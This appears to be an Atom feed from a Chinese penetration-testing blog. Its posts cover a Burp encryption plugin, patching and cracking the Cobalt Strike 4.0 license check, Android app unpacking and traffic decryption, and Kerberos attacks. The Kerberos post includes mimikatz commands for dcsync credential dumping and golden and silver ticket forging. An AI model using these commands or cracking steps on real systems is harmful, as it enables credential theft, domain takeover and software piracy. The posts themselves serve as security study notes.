<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://thekingofduck.github.io</id>
    <title>CoolCat&apos; Blog</title>
    <updated>2020-03-22T11:38:21.780Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://thekingofduck.github.io"/>
    <link rel="self" href="https://thekingofduck.github.io/atom.xml"/>
    <subtitle>当代废物</subtitle>
    <logo>https://thekingofduck.github.io/images/avatar.png</logo>
    <icon>https://thekingofduck.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, CoolCat&apos; Blog</rights>
    <entry>
        <title type="html"><![CDATA[重写一个burpJsEncrypter]]></title>
        <id>https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/</id>
        <link href="https://thekingofduck.github.io/post/ReCode-A-BurpJsEncrypter/">
        </link>
        <updated>2020-03-22T11:05:56.000Z</updated>
        <content type="html"><![CDATA[<p>Github:<a href="https://github.com/TheKingOfDuck/burpJsEncrypter">https://github.com/TheKingOfDuck/burpJsEncrypter</a></p>
<h3 id="写在前面">写在前面</h3>
<p>先说说这个项目为什么会出现。<br>
c0ny1师傅写的<a href="https://github.com/c0ny1/jsEncrypter">jsEncrypter</a>其实已经能满足日常需求，我本人也是因为这个项目成为c0ny1师傅的&quot;粉丝&quot;的。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848722634917.jpg" alt="-w814" loading="lazy"></figure>
<p>使用过的师傅都知道这个项目依赖于<code>phantomjs</code>,别人我不知道,我自己老是忘记<code>phantomjs</code>的二进制我放哪儿了,而且每次启动啥的都比较麻烦。</p>
<p>在学习Java的过程中了解到官方在<code>JDK1.6</code>添加了新的<code>ScriptEngine</code>类,允许用户直接执行<code>js</code>代码,也就是说调用<code>phantomjs</code>这件事可以,但是没必要。</p>
<h3 id="代码编写">代码编写</h3>
<p>看看核心的实现方法：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33.png" alt="F1C1AFDB-4EE7-4AB7-86BE-FB54A7462B33" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F.png" alt="49ADE7CC-F87A-4EFF-A6DD-3A7AD5916D6F" loading="lazy"></figure>
<p>调用了加载到内存中的<code>burpJsEncrypter</code>函数,代码如下：</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/B43B9A52-8508-4CC2-B058-C06AB5D5B79D.png" alt="B43B9A52-8508-4CC2-B058-C06AB5D5B79D" loading="lazy"></figure>
<p>是不是很简单...</p>
<p>再说说开发过程中遇到的最大的坑。</p>
<p>在代码中调试时使用<code>System.getProperty(&quot;user.dir&quot;)</code>获取当前路径时完全OK的,但是加载到内存后再获取就会变成：</p>
<pre><code>/var/folders/tg/z5wcq7jx3s526hykwz0pz2v00000gp/T/burp8120677802571630018.tmp/22js/
</code></pre>
<p>导致遍历<code>js</code>文件一致失败。</p>
<h3 id="如何使用">如何使用</h3>
<p>1.将本项目的js目录下的<code>js</code>文件复制到用户目录下的<code>/burp/jsFile</code>目录:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848732791664.jpg" alt="-w834" loading="lazy"></figure>
<p>文件名咋命名完全无所谓,但是main.js中<code>burpJsEncrypter</code>函数一定要有,需要人工修改的加密逻辑也就是注释中间的内容：</p>
<pre><code>//Java调用的主函数
function burpJsEncrypter(rawPayload){

	var encryptedPayload;


	//===============加密开始=================

	encryptedPayload = hex_md5(rawPayload);

	//===============加密结束=================

	return encryptedPayload;
}
</code></pre>
<p>如上面的代码中的hex_md5函数是加载到内存中的其他js文件中的函数。实战中只需要把页面中所有涉及加密的js文件下载到这个目录即可。</p>
<p>2.设置Payload处理：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/08B84570-D584-4265-9505-27D7F5821E24.png" alt="08B84570-D584-4265-9505-27D7F5821E24" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848737403466.jpg" alt="-w647" loading="lazy"></figure>
<p>选完再开始爆破即可。</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848739154768.jpg" alt="-w973" loading="lazy"></figure>
<p><strong>明文在哪儿看？</strong></p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741045333.jpg" alt="-w628" loading="lazy"></figure>
<p><strong>支持再Repeater中加密？</strong></p>
<p>选中要加密的字段,右键选择<code>burpJsEncrypter</code>菜单即可。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/burpJsEncrypter//15848705260967/15848741934886.jpg" alt="-w519" loading="lazy"></figure>
<h3 id="重要提醒">重要提醒</h3>
<p>如果c0ny1师傅那个插件你不会耍的画这个插件你估计也不会耍的,最核心的问题都是找页面中的加密逻辑,然后复制出来运行而已。</p>
<p><strong>即兴开发，Enjoy it~~</strong></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0 Stage X64 Bugs]]></title>
        <id>https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/</id>
        <link href="https://thekingofduck.github.io/post/patch-cobalt-strike-40-stage-x64-bugs/">
        </link>
        <updated>2020-03-20T09:12:05.000Z</updated>
        <content type="html"><![CDATA[<p>根据出问题的地方<code>Use x64 payload</code>,也就是stage x64生成的exe无法正常运行，跟到:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846865680139.jpg" alt="-w1532" loading="lazy"></figure>
<pre><code>boolean bool1 = DialogUtils.bool(this.options, &quot;x64&quot;);
</code></pre>
<p>如果x64被选择则进入x64生成。</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846867392378.jpg" alt="-w1037" loading="lazy"></figure>
<p>通过代码对比会发现调用的函数都没啥区别。</p>
<pre><code>new ArtifactUtils(this.client).patchArtifact(this.stager, &quot;artifact64.exe&quot;, paramString);
</code></pre>
<p>跟过来发现两个<code>patchArtifact</code>的重载方法：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846873782080.jpg" alt="-w827" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846874079370.jpg" alt="-w886" loading="lazy"></figure>
<p>可以发现，整个过程中都没有涉及到传递<code>stage</code>的架构,基本即可以断定和这中间环节没关系了。</p>
<p>继续跟到最终环节:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846898933890.jpg" alt="-w946" loading="lazy"></figure>
<p>细节出来了有没有：</p>
<pre><code>this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager(&quot;x86&quot;);
</code></pre>
<p>明显官方将<code>stage</code>固定在了x86的,所以把x64的payload写进来自然就不对了。</p>
<p><strong>验证</strong></p>
<p>将86修改为64：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846900913944.jpg" alt="-w843" loading="lazy"></figure>
<p>重新打包运行：</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902345978.jpg" alt="-w399" loading="lazy"></figure>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4_2/15846863899548/15846902520176.jpg" alt="-w845" loading="lazy"></figure>
<p>至于完整的代码怎么调整,就自己考虑咯...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Patch Cobalt Strike 4.0]]></title>
        <id>https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/</id>
        <link href="https://thekingofduck.github.io/post/Patch-Cobalt-Strike-4.0/">
        </link>
        <updated>2020-03-18T22:56:21.000Z</updated>
        <content type="html"><![CDATA[<p>拿到得程序如下:</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845637149700.jpg" alt="-w270" loading="lazy"></figure>
<p>压缩包里面存在附一条启动命令：</p>
<pre><code>java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar $*
</code></pre>
<p>启动报错：</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845638463523.jpg" alt="-w320" loading="lazy"></figure>
<p>这里的说的<code>authorization file</code>明显就是<code>cobaltstrike.auth</code>了</p>
<p>简单搜一下：</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845639620558.jpg" alt="-w476" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665841791.jpg" alt="-w1323" loading="lazy"></figure>
<p>把代码都复制过来，处理下报错：</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845665605145.jpg" alt="-w1586" loading="lazy"></figure>
<p>调用：</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845666707405.jpg" alt="-w454" loading="lazy"></figure>
<p>上来就先<code>Invalid authorization file</code>了<br>
明显resources/authkey.pub没有加载过来。</p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845671915765.jpg" alt="-w1527" loading="lazy"></figure>
<p>改一下：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845673713054.jpg" alt="-w1176" loading="lazy"></figure>
<p>给出得密钥文件运行到这里就直接return结束了。</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/2F39DF26-A29B-46EA-9F12-129C8D383DEB.png" alt="2F39DF26-A29B-46EA-9F12-129C8D383DEB" loading="lazy"></figure>
<p>既然等于0就结束了，那么把这里得0修改成其他值是不是就可以了？(cs3就是这个破解思路)</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696379774.jpg" alt="-w316" loading="lazy"></figure>
<p>明显是不得行的。在License方法中有校验：</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845696241758.jpg" alt="-w907" loading="lazy"></figure>
<p>checkLicenseGUI函数得第一个判断就是检测凭证是否有效。值来源于:</p>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845698414371.jpg" alt="-w277" loading="lazy"></figure>
<p>对应修改一下：</p>
<figure data-type="image" tabindex="13"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845737520463.jpg" alt="-w277" loading="lazy"></figure>
<p>然后提示过期:</p>
<figure data-type="image" tabindex="14"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845700315413.jpg" alt="-w483" loading="lazy"></figure>
<p>懒人得做法：直接将这个判断删掉。</p>
<figure data-type="image" tabindex="15"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845706501051.jpg" alt="-w1018" loading="lazy"></figure>
<p>改完就可以直接进加载出UI来了。<br>
<img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E.png" alt="67ADD37F-7926-40B1-9AC8-AFAFFF6ECB0E" loading="lazy"></p>
<p>对应的也报了不少错误，并不能正常运行...说明还有多处校验了.</p>
<p>这种动不动就删减代码的破解方式自然不是最佳方案。</p>
<p>回归到：</p>
<figure data-type="image" tabindex="16"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845710917584.jpg" alt="-w904" loading="lazy"></figure>
<p>既然是因为密钥文件不对而导致的这里对比失败,那么直接硬写一条正确的结果进去即可:</p>
<figure data-type="image" tabindex="17"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845712703919.jpg" alt="-w1007" loading="lazy"></figure>
<p>比如：</p>
<figure data-type="image" tabindex="18"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/C4C0BB95-040B-46B2-9C01-DE985474A38A.png" alt="C4C0BB95-040B-46B2-9C01-DE985474A38A" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845720512205.jpg" alt="-w1236" loading="lazy"></figure>
<p>至于这个正确的结果如何拿到，就得感谢有花钱购买以及分享出来的师傅了给予白嫖的机会了。</p>
<figure data-type="image" tabindex="20"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/15845719954394.jpg" alt="-w955" loading="lazy"></figure>
<p>去除exit暗桩：</p>
<figure data-type="image" tabindex="21"><img src="https://thekingofduck.github.io/post-images/cs4/15845636285780/1.png" alt="-w955" loading="lazy"></figure>
<p>指纹似乎不存在，listener问题也不存在。</p>
<p>阿门，原谅我没钱只能白嫖了...</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[某APP逆向分析与通讯解密]]></title>
        <id>https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/</id>
        <link href="https://thekingofduck.github.io/post/Android-Program-Reverse-Analysis/">
        </link>
        <updated>2020-03-17T08:15:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-初始化">0x01 初始化</h3>
<p>年轻人，你是否因看到这样的逆向结果而感到无力？</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/26DD303B-1B36-49D7-9A00-CD772B7556C9.png" alt="" loading="lazy"></figure>
<p>你是否为抓不到包而感觉渗透失去了意义？</p>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844200931687.jpg" alt="" loading="lazy"></figure>
<p>回归正题，拿到app后初步了解后有下面几个问题：</p>
<ul>
<li>无法抓包</li>
<li>做了加固</li>
<li>通讯加密</li>
</ul>
<p>也是常见APP反篡改的手段了，简单记录一下自己是如何解决这些问题的。</p>
<h3 id="0x02-加载中">0x02 加载中</h3>
<h4 id="无法抓包">无法抓包</h4>
<p>姿势其实特别多，大部分app的做法都只是反代理，挂vpn是不会拒绝连接的，所以原理上只需要建一个虚拟vpn，使app流量通过这个vpn中转，中间环节解密流量即可。</p>
<p>参考工具<br>
安卓：HttpCanary<br>
苹果：Surge (随便问问有没有师傅组队买surge mac版的授权)</p>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844205931604.jpg" alt="-w522" loading="lazy"></figure>
<h4 id="做了加固">做了加固</h4>
<p>已知思路有三，</p>
<ul>
<li>脱壳</li>
<li>模拟人工</li>
<li>Hook包中的相关函数直接进行测试</li>
</ul>
<p><strong>脱壳前</strong></p>
<p>脱壳方式/工具也是蛮多的，引用一位师傅说过的话：</p>
<p>1.默念一声&quot;我想脱个壳&quot;。<br>
2.启动 APP。<br>
3.启动 frida-server。<br>
4.python main.py。</p>
<p>默数三秒，脱好了。</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844277956685.jpg" alt="-w880" loading="lazy"></figure>
<p>第二种方式的demo:</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844214019846.jpg" alt="-w1225" loading="lazy"></figure>
<p>第三中方式用的人最多，但是比较麻烦，加壳了找函数不方便，不加壳的话直接看代码硬怼就是行。</p>
<p><strong>脱壳后</strong></p>
<p>dex2jar，然后丢进反编译工具</p>
<p>找核心算法其实很容易，比如直接搜一下加密包中header的特征字段</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844290955076.jpg" alt="-w450" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844289523233.jpg" alt="-w1480" loading="lazy"></figure>
<p>跟踪到下面的加密部分：<br>
<img src="https://thekingofduck.github.io/post-images/app1/15844107807705/7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14.png" alt="7C6DE6AD-DEC5-4D38-8D67-BCD2C7873D14" loading="lazy"><br>
圈起来的为止就是加密的关键点了，点击一下跳过去即可。</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/6F2066C9-F42F-4A59-BBFE-E76001CA679D.png" alt="6F2066C9-F42F-4A59-BBFE-E76001CA679D" loading="lazy"><br>
传入的第一个字符串是需要加密的值，第二个是密钥。密钥可以在上上图中<code>getEncryptAES(paramRequest)</code>跟过去找到：</p>
<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/388D7F7D-0A24-406E-B0A8-194687ECF9D2.png" alt="388D7F7D-0A24-406E-B0A8-194687ECF9D2" loading="lazy"></figure>
<p>加密算法代码已知，密钥已知，那顺手就可以copy出来自己加解密了：</p>
<figure data-type="image" tabindex="9"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/E32C1720-8214-434B-975F-FD9B65E82F9A.png" alt="E32C1720-8214-434B-975F-FD9B65E82F9A" loading="lazy"></figure>
<p>还可以顺手写成burp插件，方便进行漏洞测试：</p>
<p><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/216107F1-9491-4FE8-ACC4-91E5050D5F51.png" alt="216107F1-9491-4FE8-ACC4-91E5050D5F51" loading="lazy"><br>
注册一个右键菜单方便在repeater里面加解密，注册一个payload处理，方便用于爆破之类的操作。</p>
<figure data-type="image" tabindex="10"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/77583F6C-3A67-420B-B86A-4E94CFEF0A85.png" alt="77583F6C-3A67-420B-B86A-4E94CFEF0A85" loading="lazy"></figure>
<p>打包一下就可以扔给burp了。</p>
<figure data-type="image" tabindex="11"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844303010949.jpg" alt="-w1480" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://thekingofduck.github.io/post-images/app1/15844107807705/15844304184113.jpg" alt="-w627" loading="lazy"></figure>
<p>一切顺利成章。</p>
<h3 id="0x03-加载成功">0x03 加载成功</h3>
<p>抓包问题可以以微信为测试目标进行尝试，能抓到微信的其他的基本也就都可以抓到了；脱壳不能指望静态脱壳，还是多考虑怎么从内存中提取出dex来；通讯解密/反校验需要java基础，跟着代码构造出正确的数据包即可，看多了其实也就那么几种算法，各个算法加解密的要素了然于心后还原出解密代码不过copy一下，再解决反编译工具的错误即可；写burp插件也是一个样子，看多了就和套模板，背答案做题目差不多。</p>
<p>解决抓包，解决脱壳，再解决通讯加密后就是常规的web测试方法了，一切变得索然无味。</p>
<p><strong>技术交流：</strong></p>
<ul>
<li>WX:TheKingOfGaGaGa</li>
<li>Github:<a href="https://github.com/TheKingOfDuck">https://github.com/TheKingOfDuck</a></li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记五：攻击Kerbroes]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-5-Attack-Kerbroes/">
        </link>
        <updated>2020-03-04T10:10:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="用户名遍历">用户名遍历</h3>
<p>回顾Kerbroe的认证流程第一步：</p>
<ul>
<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
</ul>
<p>如果Web测试做的多就知道第一步就存在用户名遍历问题。</p>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583318637446.png" alt="" loading="lazy"></figure>
<h3 id="票据伪造">票据伪造</h3>
<h4 id="golden-ticket">Golden Ticket</h4>
<p>AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的的来的，krbtgt用户的hash也是可以提取出来的，这就意味着ticket是可以自己计算出来的。Golden Ticket就是自己计算TGT去生成的TGS，换在买车票的比喻中就相当于伪造身份证去买票。</p>
<p><strong>Golden Ticket价值和域控相似</strong></p>
<p>伪造条件：</p>
<ul>
<li>Domain SID</li>
<li>Domain name</li>
<li>需要krbtgt用户的hash</li>
<li>用户名随意</li>
</ul>
<p>伪造过程</p>
<p>1.获取krbtgt hash</p>
<pre><code>mimikatz &quot;lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt&quot; &quot;exit&quot; &gt; krbtgthash.txt
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583324821594.png" alt="" loading="lazy"></figure>
<p>2.生成票据文件</p>
<pre><code>mimikatz &quot;kerberos::golden /admin:CoolCat /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /krbtgt:b0164177afec62432418903208c1e247 /ticket:golden.kiribi&quot;  &quot;exit&quot;
</code></pre>
<p>其中sid最后一个“-”之后的要去掉，这个很细节。<br>
<img src="https://thekingofduck.github.io/post-images/1583326167707.png" alt="" loading="lazy"></p>
<p>3.将票据文件导入内存</p>
<pre><code>mimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt golden.kiribi&quot; &quot;kerberos::list&quot; &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583326531630.png" alt="" loading="lazy"></figure>
<p>图中红线前后为导入金票前后的权限差异。</p>
<p>值得一提的是目前这个金票只能在域内使用使用，不能跨域，涉及到跨域，域森林时该金票就被局限了，不过可以配合SIDHistory去生成包含根域的金票。</p>
<p>可参考：http://t3ngyu.leanote.com/post/7697c6e55644</p>
<h4 id="silver-tickets">Silver Tickets</h4>
<p>已知目标机器的NTLM hash和域SID时，可以伪造任意用户访问目标机器上的指定服务。其过程不会与KDC通信，因此不会再KDC上留下任何痕迹，只会在目标机器和本机留下日志。可以利用的服务：</p>
<table>
<thead>
<tr>
<th>服务注释</th>
<th>服务名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST&amp;RPCSS</td>
</tr>
<tr>
<td>Powershell Remoteing</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST&amp;HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>LDAP、DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows File Share（CIFS）</td>
<td>CIFS</td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS&amp;LDAP&amp;CIFS</td>
</tr>
</tbody>
</table>
<p>伪造条件</p>
<ul>
<li>
<p>Domain SID</p>
</li>
<li>
<p>Domain name</p>
</li>
<li>
<p>目标机器的NTLM hash</p>
</li>
<li>
<p>任意用户</p>
<p>伪造过程：</p>
<p>导出目标机器的hash：</p>
</li>
</ul>
<pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;  &quot;exit&quot; &gt; hash.txt
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583327211454.png" alt="" loading="lazy"></figure>
<pre><code>mimikatz &quot;kerberos::golden /domain:adstudy.com /sid:S-1-5-21-290613818-3246529070-3099575750 /target:bot.adstudy.com /service:cifs /rc4:b0f256f8b3bca01555101864efef02ac /user:silver /ptt&quot; &quot;exit&quot;
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583329253794.png" alt="" loading="lazy"></figure>
<p>伪造成功后可使用klist查看票据,指令中伪造的服务是cifs，即Windows File Share（CIFS），在域内机器上测试的，本身就没限制，所以伪造了银票也没啥子用，就不截图了，如果伪造其他有权限限制机器上的服务即可越过限制。</p>
<h3 id="总结">总结</h3>
<p>金票权限大，但是要过kdc，会留下日志。<br>
银票局限在特定服务内使用，不过kdc，只在域服务机器上留下日志。</p>
<p>两者分别去读hash时都需要管理员权限，这是致命的缺陷，在攻击过程中就出现：</p>
<p>&quot;有管理权限就可以直接读管理密码了，要金票银票何用？&quot;</p>
<blockquote>
<p>可以用在权限维持上。</p>
</blockquote>
<p>参考文章：</p>
<p><a href="http://t3ngyu.leanote.com/post/Silver-Tickets">域渗透-权限维持之 Silver Tickets</a><br>
<a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.md">域渗透-Ticket</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[域渗透学习笔记四：域认证机制Kerbroes刨析]]></title>
        <id>https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/</id>
        <link href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/">
        </link>
        <updated>2020-03-04T04:12:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="基础知识">基础知识</h3>
<p>Active Directory 活动目录，可以将其理解就是域服务。</p>
<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583199291763.PNG" alt="" loading="lazy"></figure>
<p>负责域内机器管理，用户管理，资源管理，桌面配置，应用支撑等等。</p>
<p><strong>Kerbroes的特点：</strong></p>
<ul>
<li>不依赖于主机认证。</li>
<li>不怕中间人攻击。</li>
<li>使用密钥系统提供认证服务。</li>
</ul>
<p><strong>参与的角色</strong></p>
<ul>
<li>
<p>Client</p>
</li>
<li>
<p>Server</p>
</li>
<li>
<p>KDC（Key Distribution Center 密钥分发中心）</p>
<p>(小结：性质类似于Web中的session)</p>
</li>
</ul>
<p>细分<strong>KDC中的角色</strong>：</p>
<ul>
<li>AD: account database的缩写，其储存了Client白名单，只有在白名单内的Client才能申请TGT</li>
<li>AS：Authentication Service的缩写，验证Client端的身份并为Client生成TGT的服务器</li>
<li>TGS：Ticket Cranting Service的缩写，为Client生成指定服务ticket。</li>
</ul>
<p><strong>物理层面AD和KDC都是域控</strong></p>
<h3 id="kerbroes认证分析">Kerbroes认证分析</h3>
<p>从KDC的参与角色中可以了解到认证分为三块六小步，即一发一收的三个来回。</p>
<ul>
<li>1.Client请求Kerberos服务(请求中包含了Client Name 也就是用户名)，如果主机名存在于ad中，就放回TGT给Client</li>
<li>2.Client拿着TGT去向Kerbroes发起请求说需要指定服务的权限，AS返回Ticket给Client。</li>
<li>3.Client拿着Ticket去请求登录服务，服务那边又会去问Kerbroes这个ticket是否是真实的，是就给通过，认证完成。</li>
</ul>
<p>引用一张其他师傅画好的比喻图</p>
<figure data-type="image" tabindex="2"><img src="https://camo.githubusercontent.com/ff275187a475867d6d59773793706b7e26de54eb/68747470733a2f2f696d6167652e333030312e6e65742f696d616765732f32303139303232322f313535303830383234305f356336663734623030363530652e706e67" alt="" loading="lazy"></figure>
<p>个人的理解是这样</p>
<p>将Kerbroes比作购票APP。认证流程比作买票。</p>
<ul>
<li>1.首先你使用身份证(Client name)去购票APP进行注册，购票APP需要核实你是我国公民。不是就直接拒绝(Client Name没再AD白名单中)，没有后续，是公民，但是上了征信黑名单也拒绝。(Client在AD中，但是是在黑名单中)，正常通过后就发放一个账号给你（TGT）</li>
<li>
<ol start="2">
<li>使用账号(TGT)发起买去xxxx的票的请求，买完APP返回了一张去xxxx的票给你(访问指定server的TGS)</li>
</ol>
</li>
<li>拿到票后去车站坐车，乘务员会对你的票进行检验，查看是否为真实的票据。</li>
</ul>
<h4 id="抓包分析">抓包分析</h4>
<p>以下为域用户登录认证包</p>
<p><strong>TGT获取</strong></p>
<ul>
<li>AS-REQ：</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583301307789.png" alt="" loading="lazy"></figure>
<p>Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p>
<p>AS-REP</p>
<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583301478916.png" alt="" loading="lazy"></figure>
<p>KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据</p>
<p><strong>TGS获取</strong></p>
<p>TGS-REQ</p>
<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583302306281.png" alt="" loading="lazy"></figure>
<p>请求访问指定服务</p>
<p>TGT-REP</p>
<figure data-type="image" tabindex="6"><img src="https://thekingofduck.github.io/post-images/1583302418203.png" alt="" loading="lazy"></figure>
<p>返回Ticket。(这里没分析清楚)</p>
<p><strong>TGS登录服务</strong></p>
<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583303413428.png" alt="" loading="lazy"></figure>
<p>涉及字段比较多，每个字段得含义分析不清楚，查阅资料可以看到详细流程如下：</p>
<pre><code>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳
AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。
TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求
TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)
AP_REQ: Client拿着TGS票据去请求服务
